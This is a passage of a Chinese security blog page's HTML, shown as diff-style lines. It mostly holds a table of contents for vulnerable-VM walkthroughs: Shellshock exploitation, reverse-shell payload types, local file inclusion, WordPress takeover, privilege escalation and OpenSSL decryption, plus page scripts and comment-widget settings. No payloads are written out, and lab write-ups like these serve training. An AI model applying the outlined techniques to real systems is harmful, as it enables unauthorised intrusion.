href="#config-php"><span class="toc-number">3.5.1.</span> <span class="toc-text">config.php</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9C%8B%E7%B3%BB%E7%BB%9F%E6%9C%89%E5%93%AA%E4%BA%9B%E7%94%A8%E6%88%B7"><span class="toc-number">3.5.2.</span> <span class="toc-text">看系统有哪些用户</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%88%E5%B0%9D%E8%AF%95-ssh-%E8%BF%9E%E6%8E%A5-root-%E8%B4%A6%E6%88%B7"><span class="toc-number">3.5.3.</span> <span class="toc-text">先尝试 ssh 连接 root 账户</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%9D%E8%AF%95-ssh-%E8%BF%9E%E6%8E%A5%E5%85%B6%E4%BB%96%E8%B4%A6%E6%88%B7%EF%BC%88%E9%83%BD%E7%94%A8-john-123-%E4%B9%9F%E6%9C%89%E5%8F%AF%E8%83%BD%E9%83%BD%E4%B8%8D%E8%A1%8C%EF%BC%89"><span class="toc-number">3.5.4.</span> <span class="toc-text">尝试 ssh 连接其他账户（都用 john@123   也有可能都不行）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#www-data-bashup-%E8%B4%A6%E6%88%B7%E4%B8%8D%E8%A1%8C"><span class="toc-number">3.5.5.</span> <span class="toc-text">www-data&#x2F;bashup 账户不行</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%B4%E5%88%B0-sickos"><span class="toc-number">3.5.6.</span> <span class="toc-text">直到 sickos</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%BE%97-root"><span class="toc-number">3.5.7.</span> <span class="toc-text">获得 root</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93%E5%9B%BE"><span class="toc-number">3.6.</span> <span class="toc-text">总结图</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SickOS1-1-Shellshock-%E5%8E%9F%E7%90%86%E5%92%8C%E5%88%A9%E7%94%A8%E8%BF%87%E7%A8%8B-%E8%A7%A3%E6%B3%95%E4%BA%8C"><span class="toc-number">4.</span> <span class="toc-text">SickOS1.1 - Shellshock 原理和利用过程-解法二</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#nikto-%E6%89%AB%E6%8F%8F"><span class="toc-number">4.1.</span> <span class="toc-text">nikto 扫描</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#shellshock-%E7%9A%84%E9%AA%8C%E8%AF%81"><span class="toc-number">4.2.</span> <span class="toc-text">shellshock 的验证</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-curl-%E8%AE%BE%E7%BD%AE%E4%BB%A3%E7%90%86"><span class="toc-number">4.2.1.</span> <span class="toc-text">使用 curl 设置代理</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#shellshock-%E8%8E%B7%E5%BE%97%E5%88%9D%E5%A7%8B%E7%B3%BB%E7%BB%9F-shell"><span class="toc-number">4.3.</span> <span class="toc-text">shellshock 获得初始系统 shell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%84%E9%80%A0-payload-%E6%96%B9%E5%BC%8F%E4%B8%80%EF%BC%8C%E7%94%A8-msfvenom"><span class="toc-number">4.3.1.</span> <span class="toc-text">构造 payload 方式一，用 msfvenom</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%84%E9%80%A0-payload-%E6%96%B9%E5%BC%8F%E4%BA%8C%EF%BC%8C%E7%94%A8-AI"><span class="toc-number">4.3.2.</span> <span class="toc-text">构造 payload 方式二，用 AI</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-1-Bash-%E7%9B%B4%E6%8E%A5%E5%8F%8D%E5%BC%B9%EF%BC%88%E6%9C%80%E7%AE%80%E6%B4%81%EF%BC%89"><span class="toc-number">4.3.3.</span> <span class="toc-text">✅ 1. Bash 直接反弹（最简洁）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-2-Python-%E7%89%88%E6%9C%AC%EF%BC%88%E7%9B%AE%E6%A0%87%E6%B2%A1-dev-tcp-%E6%97%B6%E6%9B%B4%E7%A8%B3%EF%BC%89"><span class="toc-number">4.3.4.</span> <span class="toc-text">✅ 2. Python 版本（目标没 &#x2F;dev&#x2F;tcp 时更稳）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-3-nc-%E4%BC%A0%E7%BB%9F%E7%89%88%EF%BC%88%E7%9B%AE%E6%A0%87%E6%9C%89-nc-%E4%B8%94%E5%B8%A6-e%EF%BC%89"><span class="toc-number">4.3.5.</span> <span class="toc-text">✅ 3. nc 传统版（目标有 nc 且带 -e）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%94%A7-%E4%BD%BF%E7%94%A8%E6%AD%A5%E9%AA%A4%EF%BC%88%E4%BB%A5-Bash-%E7%89%88%E4%B8%BA%E4%BE%8B%EF%BC%89"><span class="toc-number">4.3.6.</span> <span class="toc-text">🔧 使用步骤（以 Bash 版为例）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9A%A0%EF%B8%8F-%E5%B0%8F%E8%B4%B4%E5%A3%AB"><span class="toc-number">4.3.7.</span> <span class="toc-text">⚠️ 小贴士</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">4.4.</span> <span class="toc-text">提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%BE%97%E4%BA%A4%E4%BA%92%E5%BC%8F-shell"><span class="toc-number">4.4.1.</span> <span class="toc-text">获得交互式 shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%BA%E6%8F%90%E6%9D%83%E5%81%9A%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-number">4.4.2.</span> <span class="toc-text">为提权做信息搜集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%87%AA%E5%8A%A8%E4%BB%BB%E5%8A%A1%E6%8F%90%E6%9D%83"><span class="toc-number">4.4.3.</span> <span class="toc-text">自动任务提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%BE%97-root-%E6%9D%83%E9%99%90"><span class="toc-number">4.4.4.</span> <span class="toc-text">获得 root 权限</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93-1"><span class="toc-number">4.5.</span> <span class="toc-text">总结</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Prime1-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%92%8C%E5%88%86%E6%9E%90%E8%83%BD%E5%8A%9B%E7%9A%84%E8%AF%95%E7%82%BC-%E8%A7%A3%E6%B3%95%E4%B8%80"><span class="toc-number">5.</span> <span class="toc-text">Prime1 - 信息收集和分析能力的试炼-解法一</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#nmap-%E6%89%AB%E6%8F%8F-1"><span class="toc-number">5.1.</span> <span class="toc-text">nmap 扫描</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0-2"><span class="toc-number">5.1.1.</span> <span class="toc-text">主机发现</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#min-rate-%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-number">5.1.2.</span> <span class="toc-text">min-rate 端口扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AF%A6%E7%BB%86%E4%BF%A1%E6%81%AF%E6%89%AB%E6%8F%8F-2"><span class="toc-number">5.1.3.</span> <span class="toc-text">详细信息扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#UDP-%E6%89%AB%E6%8F%8F-2"><span class="toc-number">5.1.4.</span> <span class="toc-text">UDP 扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E8%84%9A%E6%9C%AC%E6%89%AB%E6%8F%8F-1"><span class="toc-number">5.1.5.</span> <span class="toc-text">漏洞脚本扫描</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WEB-%E6%B8%97%E9%80%8F-1"><span class="toc-number">5.2.</span> <span class="toc-text">WEB 渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E7%82%B9%EF%BC%8C%E7%9C%8B%E7%9C%8B%E9%A1%B5%E9%9D%A2%E6%A0%87%E9%A2%98%EF%BC%8C%E5%92%8C%E5%9B%BE%E7%89%87%E5%86%85%E5%AE%B9"><span class="toc-number">5.2.1.</span> <span class="toc-text">第一点，看看页面标题，和图片内容</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E7%82%B9%EF%BC%8C%E7%9C%8B%E6%BA%90%E7%A0%81-F12"><span class="toc-number">5.2.2.</span> <span class="toc-text">第二点，看源码 F12</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E7%82%B9%EF%BC%8Cdirb-%E7%9B%AE%E5%BD%95%E7%88%86%E7%A0%B4"><span class="toc-number">5.2.3.</span> <span class="toc-text">第三点，dirb 目录爆破</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#dirb-%E6%89%AB%E6%8F%8F%E6%96%87%E4%BB%B6"><span class="toc-number">5.2.4.</span> <span class="toc-text">dirb 扫描文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B7%A5%E5%85%B7%E6%94%AF%E6%8C%81"><span class="toc-number">5.2.5.</span> <span class="toc-text">工具支持</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%82%A3%E6%88%91%E4%BB%AC%E5%85%88%E5%88%97%E5%87%BA%E6%89%80%E6%9C%89%E6%89%BE%E5%88%B0%E7%9A%84-php"><span class="toc-number">5.2.6.</span> <span class="toc-text">那我们先列出所有找到的 php</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B0%9D%E8%AF%95%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%B9%B6%E5%88%A9%E7%94%A8"><span class="toc-number">5.3.</span> <span class="toc-text">尝试本地文件包含并利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ssh-%E8%AF%95%E4%B8%80%E4%B8%8B"><span class="toc-number">5.4.</span> <span class="toc-text">ssh 试一下</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#wordpress"><span class="toc-number">5.5.</span> <span class="toc-text">&#x2F;wordpress</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E7%9A%84%E5%AF%B9-CMS-%E7%9A%84%E6%89%AB%E6%8F%8F%E5%99%A8-wpscan"><span class="toc-number">5.5.1.</span> <span class="toc-text">常用的对 CMS 的扫描器 wpscan</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%9D%E8%AF%95%E7%99%BB%E5%BD%95-1"><span class="toc-number">5.5.2.</span> <span class="toc-text">尝试登录</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%88%90%E5%8A%9F%E7%99%BB%E5%BD%95-Wordpress%EF%BC%8C%E8%8E%B7%E5%BE%97%E5%90%8E%E5%8F%B0%E6%9D%83%E9%99%90"><span class="toc-number">5.5.3.</span> <span class="toc-text">成功登录 Wordpress，获得后台权限</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E5%A5%97%E8%B7%AF%E5%8C%96"><span class="toc-number">5.5.3.1.</span> <span class="toc-text">利用方式套路化</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%B8%80%EF%BC%8C%E6%8F%92%E4%BB%B6"><span class="toc-number">5.5.3.1.1.</span> <span class="toc-text">一，插件</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BA%8C%EF%BC%8C%E4%B8%BB%E9%A2%98"><span class="toc-number">5.5.3.1.2.</span> <span class="toc-text">二，主题</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%94%B1%E6%AD%A4%E8%8E%B7%E5%BE%97%E5%88%9D%E5%A7%8B%E7%B3%BB%E7%BB%9F-shell"><span class="toc-number">5.6.</span> <span class="toc-text">由此获得初始系统 shell</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#root-NOPASSWD-home-saket-enc"><span class="toc-number">5.6.0.1.</span> <span class="toc-text">(root) NOPASSWD: &#x2F;home&#x2F;saket&#x2F;enc</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%9D%E8%AF%95%E6%8F%90%E6%9D%83-1"><span class="toc-number">5.6.1.</span> <span class="toc-text">尝试提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#saket-%E7%94%A8%E6%88%B7"><span class="toc-number">5.6.2.</span> <span class="toc-text">saket 用户</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%B3%BB%E7%BB%9F%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E6%8F%90%E6%9D%83"><span class="toc-number">5.7.</span> <span class="toc-text">系统内核漏洞提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93-2"><span class="toc-number">5.8.</span> <span class="toc-text">总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E8%A7%A3%E6%B3%95%EF%BC%81%EF%BC%81%EF%BC%81%EF%BC%81"><span class="toc-number">5.9.</span> <span class="toc-text">其他解法！！！！</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Prime1-%E6%90%9E%E6%87%82-OpenSSL-%E8%A7%A3%E5%AF%86%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83-%E8%A7%A3%E6%B3%95%E4%BA%8C"><span class="toc-number">6.</span> <span class="toc-text">Prime1 - 搞懂 OpenSSL 解密渗透提权-解法二</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83%E6%9E%9A%E4%B8%BE"><span class="toc-number">6.1.</span> <span class="toc-text">提权枚举</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ENC-%E6%8E%A2%E7%B4%A2%E4%B8%8E%E6%9F%A5%E6%89%BE"><span class="toc-number">6.2.</span> <span class="toc-text">ENC 探索与查找</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF-enc"><span class="toc-number">6.2.1.</span> <span class="toc-text">什么是 enc</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#find-%E6%8A%80%E5%B7%A7"><span class="toc-number">6.2.2.</span> <span class="toc-text">find 技巧</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%A7%E8%A1%8C-enc"><span class="toc-number">6.2.3.</span> <span class="toc-text">执行 enc</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ENC-%E7%A0%B4%E8%A7%A3"><span class="toc-number">6.3.</span> <span class="toc-text">ENC 破解</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E5%BC%A0%E9%80%9F%E6%9F%A5%E8%A1%A8%EF%BC%88%E5%A4%9F%E7%94%A8-90-%E5%9C%BA%E6%99%AF%EF%BC%89"><span class="toc-number">6.3.1.</span> <span class="toc-text">一张速查表（够用 90 % 场景）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AE%B0%E5%BF%86%E5%8F%A3%E8%AF%80"><span class="toc-number">6.3.2.</span> <span class="toc-text">记忆口诀</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#OpenSSL-%E7%A0%B4%E8%A7%A3%E8%AF%AD%E5%8F%A5"><span class="toc-number">6.4.</span> <span class="toc-text">OpenSSL 破解语句</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CipherType-%E5%8F%82%E6%95%B0"><span class="toc-number">6.4.1.</span> <span class="toc-text">-CipherType 参数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#K-%E5%8F%82%E6%95%B0"><span class="toc-number">6.4.2.</span> <span class="toc-text">-K 参数</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bash-%E8%84%9A%E6%9C%AC-For-%E5%BE%AA%E7%8E%AF"><span class="toc-number">6.5.</span> <span class="toc-text">bash 脚本 For 循环</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ssh-%E8%BF%9E%E6%8E%A5"><span class="toc-number">6.6.</span> <span class="toc-text">ssh 连接</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B0%9D%E8%AF%95%E6%8F%90%E6%9D%83-2"><span class="toc-number">6.7.</span> <span class="toc-text">尝试提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E3%80%81-bin-bash%EF%BC%88shebang-hash-bang%EF%BC%89"><span class="toc-number">6.7.1.</span> <span class="toc-text">一、#!&#x2F;bin&#x2F;bash（shebang &#x2F; hash-bang）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C%E3%80%81-bin-bash-%E6%9C%AC%E8%BA%AB"><span class="toc-number">6.7.2.</span> <span class="toc-text">二、&#x2F;bin&#x2F;bash 本身</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8F%90%E6%9D%83%E7%BB%93%E6%9D%9F"><span class="toc-number">6.7.3.</span> <span class="toc-text">提权结束</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93-3"><span class="toc-number">6.8.</span> <span class="toc-text">总结</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#OpenSSL-%E7%9B%B8%E5%85%B3%E5%86%85%E5%AE%B9"><span class="toc-number">7.</span> <span class="toc-text">OpenSSL 相关内容</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%AF%B9%E7%A7%B0-vs-%E9%9D%9E%E5%AF%B9%E7%A7%B0-%E5%BF%AB%E9%80%9F%E5%AF%B9%E7%85%A7"><span class="toc-number">7.0.1.</span> <span class="toc-text">1. 对称 vs 非对称 快速对照</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E9%9D%9E%E5%AF%B9%E7%A7%B0%E5%8A%A0-%E8%A7%A3%E5%AF%86%E5%AE%9E%E6%88%98%E7%A4%BA%E4%BE%8B"><span class="toc-number">7.0.2.</span> <span class="toc-text">2. 非对称加&#x2F;解密实战示例</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A0-%E5%85%88%E7%94%9F%E6%88%90%E5%AF%86%E9%92%A5%E5%AF%B9"><span class="toc-number">7.0.2.1.</span> <span class="toc-text">① 先生成密钥对</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A1-%E5%85%AC%E9%92%A5%E5%8A%A0%E5%AF%86"><span class="toc-number">7.0.2.2.</span> <span class="toc-text">② 公钥加密</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A2-%E7%A7%81%E9%92%A5%E8%A7%A3%E5%AF%86"><span class="toc-number">7.0.2.3.</span> <span class="toc-text">③ 私钥解密</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A3-%E4%B8%80%E9%94%AE%E6%95%B0%E5%AD%97%E4%BF%A1%E5%B0%81%EF%BC%88%E8%87%AA%E5%8A%A8%E6%B7%B7%E5%90%88%E5%8A%A0%E5%AF%86%EF%BC%89"><span class="toc-number">7.0.2.4.</span> <span class="toc-text">④ 一键数字信封（自动混合加密）</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E9%9D%9E%E5%AF%B9%E7%A7%B0%E7%AD%BE%E5%90%8D-%E9%AA%8C%E7%AD%BE%EF%BC%88%E5%B8%B8%E7%94%A8%EF%BC%89"><span class="toc-number">7.0.3.</span> <span class="toc-text">3. 非对称签名&#x2F;验签（常用）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%80%BB%E7%BB%93"><span class="toc-number">7.0.4.</span> <span class="toc-text">4. 一句话总结</span></a></li></ol></li></ol></li></ol>
+      </div>
+      
+        <div class="catelogue catelogue-2">
+          
+            <p>
+              <span>上一篇：</span>
+              <a href="/2026/03/20/靶机精炼-思路为王（二）/">靶机精炼-思路为王（二）</a>
+            </p>
+           
+          
+            <p>
+              <span>下一篇</span>
+              <a href="/2026/03/19/票据攻击/">票据攻击</a>
+            </p>
+          
+        </div>
+      
+    </div>
+  </div>
+</div>
+
+
+<script>
+  // var定义，避免pjax重新进来造成的重复声明错误
+  var config = JSON.parse('{"enable":true,"appId":"Pf8zCXGEH1qsprnWfikVVujL-gzGzoHsz","appKey":"qOqoiUHhH1TGtLRUYURkLRQX","placeholder":"请留下你宝贵的意见吧\\x7e","meta":["nick"],"recordIP":true,"visitor":true,"enableQQ":true}')
+  new Valine({
+    el: '#vcomments',
+    appId: config.appId,
+    appKey: config.appKey,
+    placeholder: config.placeholder,
+    meta: config.meta,
+    recordIP: config.recordIP,
+    visitor: config.visitor,
+    enableQQ: config.enableQQ,
+    path: '2026/03/20/靶机精炼-思路为王（一）/'
+  })
+</script>
+
+
+<script>
+  $(document).on('pjax:complete', function() {
+    const tocs = document.querySelector('.toc')
+    const links = tocs ? tocs.querySelectorAll('a') : []
+    links.forEach(link => {
+      link.addEventListener('click', e => {
+        const href = decodeURIComponent(e.href)
+        href.search(/#(.*)/)
+        const id = RegExp.$1
+        const target = document.querySelector('#' + id)
+        const top = target.offsetTop
+        document.documentElement.scrollTo({
+          top: top - 100,
+          behavior: 'smooth'
+        })
+        e.preventDefault()
+      })
+    })
+  })
+</script> 
+
+</div>
+      <div class="main-right-wrapper"><div class="main-right">
+  <div class="main-right--board">
+    <div class="main-right--title">
+      <h5>公告栏</h5>
+      <i class="iconfont icon-gonggao"></i>
+    </div>
+    <div class="main-right--content">
+      Hello，欢迎你们来到博客小站，希望能在这里收获到有用的东西哦！ 
+    </div>
+  </div>
+
+  <div id="aplayer" class="main-right--music"></div>
+
+  <div class="operate-items">
+    <div class="operate-item backtop">
+      <i class="iconfont icon-huidaodingbu"></i>
+      <span>回到顶部</span>
+    </div>
+    
+    <div class="operate-item turn-comment hidden">
+      <i class="iconfont icon-pinglun"></i>
+      <span>查看评论</span>
+    </div>
+    
+  </div>
+
+  <div class="main-right--site">
+    <div class="main-right--power">
+      <p>Power By <a target="_blank" rel="noopener" href="https://hexo.io/zh-cn/docs/">Hexo</a>.</p>
+      <p>Theme：<a target="_blank" rel="noopener" href="https://github.com/Aizener/hexo-theme-cola">Cola.</a></p>
+    </div>
+    <p class="main-right--refer"><a target="_blank" rel="noopener" href="https://beian.miit.gov.cn/#/Integrated/index">...</a> </p>
+  </div>
+</div>
+
+<script>
+  function setOperateItem () {
+    const reg = /\d{4}\/\d{2}\/\d{2}\/.+/
+    const path = location.pathname
+    const operateDom = document.querySelector('.main-right .operate-items')
+    const commentDom = document.querySelector('.turn-comment')
+    const cateloguDom = document.querySelector('.article-catelogue > .article-catelogue--wrapper');
+
+    if (commentDom) {
+      if (reg.test(path) || path.match(/\/log\/.+/)) {
+        commentDom.classList.remove('hidden')
+        const newDom = operateDom.cloneNode(true);
+        const _backtopDom = newDom.querySelector('.backtop');
+        const _commentDom = newDom.querySelector('.turn-comment');
+        _backtopDom.addEventListener('click', () => backTopEvent());
+        _commentDom.addEventListener('click', () => commentDomEvent());
+        cateloguDom.appendChild(newDom);
+      } else {
+        commentDom.classList.add('hidden')
+      }
+    }
+  }
+
+  setOperateItem()
+  const musics = JSON.parse(`[{"name":"安河桥","artist":"宋冬野","url":"http://ting6.yymp3.net:82/new25/songdongye/11.mp3","cover":"https://img2.baidu.com/it/u=1260056724,1076343118&fm=253&fmt=auto&app=138&f=JPEG?w=500&h=500"},{"name":"卡布达","artist":"暂无","url":"music/kabuda.mp3","cover":"https://img2.baidu.com/it/u=705831265,2862720033&fm=253&fmt=auto&app=138&f=JPEG?w=500&h=500"}]`)
+  const ap = new APlayer({
+    container: document.querySelector('#aplayer'),
+    audio: musics,
+  })
+
+  $(document).on('pjax:complete', function() {
+    setOperateItem()
+  })
+
+  document.querySelector('.backtop').addEventListener('click', () => {
+    backTopEvent();
+  })
+  const dom = document.querySelector('.turn-comment')
+  dom && dom.addEventListener('click', () => {
+    commentDomEvent();
+  })
+
+  function backTopEvent() {
+    document.documentElement.scrollTo({
+      top: 0,
+      behavior: 'smooth'
+    })
+  }
+
+  function commentDomEvent() {
+    const commentDom = document.querySelector('.comments-intro')
+    if (!commentDom) return
+    const top = commentDom.offsetTop, height = commentDom.offsetHeight
+    document.documentElement.scrollTo({
+      top: top - 2 * height,
+      behavior: 'smooth'
+    })
+  }
+</script></div>
+    </section>
+  </div>
+  <div id="progress" class="progress"></div>
+  <div id="gray" class="gray"></div>
+
+  <script>
+    function initScroll () {
+      document.addEventListener('scroll', () => {
+        const doc = document.documentElement
+        const scrollTop = doc.scrollTop
+        const pageHeight = doc.offsetHeight
+        const clientHeight = doc.clientHeight
+        const ratio = scrollTop / (pageHeight - clientHeight)
+        const progress = document.querySelector('#progress')
+        const avatarImg = document.querySelector('.main-left--avatar')
+        progress.style.width = (100 * ratio) + '%'
+        avatarImg.style.transform = `rotate(${360 * ratio}deg)`
+      })
+    }
+
+    const rootPath = "/"
+
+    const checkAndSetArticlePageLayout = () => {
+      const path = location.pathname.replace(rootPath, '');
+      if (
+        /^\/?\d{4}\/\d{2}\/\d{2}\/.*/.test(path) ||
+        /^log\/.+/.test(path)
+      ) {
+        $('.main-container, .main-right, .main-right-wrapper').addClass('is-article')
+      } else {
+        $('.main-container, .main-right, .main-right-wrapper').removeClass('is-article')
+      }
+    }
+
+    const gray = "none"
+    const setGrayStyle = () => {
+      if (gray === 'none') {
+        return
+      } else if (gray === 'index') {
+        location.pathname === '/' ? $('#gray').show() : $('#gray').hide()
+      } else if (gray === 'all') {
+        $('#gray').show()
+      }
+    }
+    setGrayStyle()
+
+
+    window.onload = function () {
+      checkAndSetArticlePageLayout()
+      setTimeout(() => {
+        $('#load').slideUp()
+        $('#container').slideToggle()
+        setTimeout(() => {
+          initScroll();
+        }, 500)
+      }, 500)
+    }
+    
+    let status = 0
+    // 对所有链接跳转事件绑定pjax容器container
+    $(document).pjax('a[target!=_blank]', '#main-container', {
+      container: '#main-container',
+      fragment: '#main-container',
+      timeout: 8000
+    })
+
+    $(document).on('pjax:start', function() {
+    })
+    $(document).on('pjax:complete', function() {
+      status = 0
+      $('.main-container').addClass('to-up').on('animationend', function() {
+        $(this).removeClass('to-up')
+      })
+      setGrayStyle()
+      checkAndSetArticlePageLayout()
+    })
+    $(document).on('pjax:popstate', function() {
+      status = -1
+      checkAndSetArticlePageLayout()
+    });
+  </script>
+</body>
+</html>
